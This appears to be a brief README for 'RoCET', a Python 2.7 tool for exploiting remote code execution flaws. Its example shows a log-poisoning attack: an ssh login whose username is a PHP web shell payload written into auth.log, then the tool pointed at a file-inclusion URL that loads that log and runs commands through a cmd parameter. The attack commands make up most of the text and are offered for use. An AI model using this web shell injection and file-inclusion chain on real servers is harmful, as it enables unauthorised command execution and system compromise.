# RoCET
RoCET is a script to interface with remote code execution vulnerabilities.

Relies on being able to read/write to a file, reading the file with curl


## Requirements
Python 2.7.X

pycurl, argparse, sys, os, StringIO

## Example
### using evilscience
`ssh '<?php echo system($_GET[cmd]); ?>'@192.168.150.129`

`./RoCET -u 'http://192.168.150.129/index.php?file=/var/log/auth.log&' -v cmd`
